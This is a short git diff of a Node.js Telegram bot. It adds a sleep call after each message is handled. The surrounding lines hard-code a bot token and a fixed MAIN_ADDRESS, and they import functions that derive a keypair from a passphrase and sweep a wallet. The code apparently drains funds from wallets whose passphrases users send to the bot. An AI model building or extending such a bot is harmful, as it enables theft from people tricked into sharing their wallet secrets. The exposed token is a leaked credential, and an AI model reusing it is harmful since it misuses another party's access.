@@ -1,5 +1,5 @@
 import TelegramBot from "node-telegram-bot-api";
-import { getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sweepWallet } from "./utils/fn.js";
+import { getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -83,6 +83,8 @@ bot.on('message', async (msg) => {
             } catch(error) {
                 bot.sendMessage(chatId, `❌ Something went wrong, please try again`);
             }
+
+            await sleep(2500);
         }
 
         delete userSessions[chatId]
